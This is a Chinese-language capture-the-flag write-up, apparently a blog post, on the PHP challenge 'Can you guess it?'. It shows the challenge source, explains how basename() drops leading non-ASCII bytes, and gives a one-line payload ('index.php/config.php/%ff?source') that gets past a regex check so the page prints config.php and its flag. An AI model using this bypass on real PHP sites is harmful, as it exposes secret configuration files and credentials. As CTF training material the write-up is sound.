+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&lt;?php if (isset($message)) &#123; ?&gt;</span><br><span class="line">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>basename()会返回路径重的文件名部分。&#x2F;index.php&#x2F;config.php使用basename()之后返回config.php。<br>basename()会去掉文件名开头的非ASCII值。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">basename(&quot;xffconfig.php&quot;)=config.php</span><br></pre></td></tr></table></figure>
+
+<p>flag在config.php中，可以通过highlight_file(basename($_SERVER[‘PHP_SELF’]));来显示config.php；</p>
+<p>查wp说$message &#x3D; ‘Congratulations! The flag is: ‘ . FLAG;之前要满足随机数什么的，难度太大，不选择这个方法。<br>可以使用不可显字符绕过正则</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">    echo &quot;&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>匹配尾部的可以通过不可显字符绕过，比如%ff来绕过正则匹配</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure>
 
 ]]></content>
   </entry>
